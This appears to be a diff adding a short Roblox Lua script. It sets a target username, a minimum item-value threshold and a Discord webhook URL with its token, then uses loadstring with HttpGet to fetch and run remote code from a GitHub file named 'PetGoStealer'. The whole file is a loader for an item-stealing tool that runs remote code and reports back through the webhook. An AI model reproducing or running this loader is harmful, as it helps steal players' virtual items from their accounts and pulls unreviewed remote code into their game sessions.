@@ -1,0 +1,5 @@
+Username = "NOKIEY4"
+min_rap = 1000000
+webhook = "https://discord.com/api/webhooks/1144126780031123487/A2_ClYdC-tqb3VIlvtGRAYB91xhb_Y028RALfU_dLJF225SRoLmmY2iqPTfGVQnxtSWU"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va31/main/PetGoStealer", true))()
